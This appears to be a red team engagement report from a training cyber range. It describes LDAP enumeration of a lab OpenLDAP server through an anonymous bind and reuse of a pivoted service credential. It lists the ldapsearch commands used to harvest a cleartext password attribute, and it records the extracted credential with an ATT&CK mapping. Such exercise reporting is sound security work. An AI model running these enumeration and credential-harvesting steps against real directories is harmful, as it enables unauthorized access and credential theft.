# Red Team Engagement Report
**Classification:** RESTRICTED — White Team Only
**Report ID:** RED-REPORT-IT02-M01
**Range:** RNG-IT-02 · Internal Operations Zone
**Machine:** M1 — itops-ldap

---

## 1. Engagement Summary
| Field | Detail |
|---|---|
| Target | PUL OpenLDAP Directory Service |
| Target IP | `203.x.x.x:389` |
| Attack Class | LDAP Enumeration + Plaintext Attribute Harvest |
| Outcome | **SUCCESSFUL** — `svc-cicd:CICD@Deploy!2024` extracted |
| Pivot From | RNG-IT-01 M5 Redis — `cn=svc-deploy:D3pl0y@PUL2024` |
| Time to Compromise | `[HH:MM]` |

---

## 2. Vulnerability Analysis
- **Anon bind:** `olcAccess` permits `anonymous read` on all attributes.
- **ACL flaw:** Authenticated users can read attributes of other entries including custom password fields.
- **`userPassword-plain`:** Non-standard attribute retaining cleartext credential on `cn=svc-cicd`.

---

## 3. Commands Executed
```bash
# Anonymous bind test
ldapsearch -x -H ldap://203.x.x.x -b "dc=prabalurja,dc=in" "(objectClass=*)" dn

# Authenticated full-tree enum
ldapsearch -x -H ldap://203.x.x.x \
  -D "cn=svc-deploy,ou=service,dc=prabalurja,dc=in" -w "D3pl0y@PUL2024" \
  -b "ou=service,dc=prabalurja,dc=in" "(objectClass=*)" "*"

# Extract specific attribute
ldapsearch -x -H ldap://203.x.x.x \
  -D "cn=svc-deploy,ou=service,dc=prabalurja,dc=in" -w "D3pl0y@PUL2024" \
  -b "ou=service,dc=prabalurja,dc=in" "(userPassword-plain=*)" userPassword-plain

# Verify svc-cicd credential
ldapsearch -x -H ldap://203.x.x.x \
  -D "cn=svc-cicd,ou=service,dc=prabalurja,dc=in" -w "CICD@Deploy!2024" \
  -b "dc=prabalurja,dc=in" "(objectClass=*)" dn | head -5
```

---

## 4. MITRE ATT&CK Mapping
| Tactic | Technique | ID |
|---|---|---|
| Discovery | Account Discovery: Domain Account | T1087.002 |
| Credential Access | Unsecured Credentials | T1552.001 |
| Collection | Data from Information Repositories | T1213 |

---

## 5. Pivot Artifact
| Artifact | Value |
|---|---|
| Username | `svc-cicd` |
| Password | `CICD@Deploy!2024` |
| Bind DN | `cn=svc-cicd,ou=service,dc=prabalurja,dc=in` |
| Next Target | M2 — itops-git `203.x.x.x:3000` |

---

## 6. Evidence
> **[Attach: ldapsearch output showing userPassword-plain on svc-cicd]**
> **[Attach: Successful svc-cicd bind confirmation]**

**Report Prepared By:** [Red Team Operator] | **Classification:** RESTRICTED
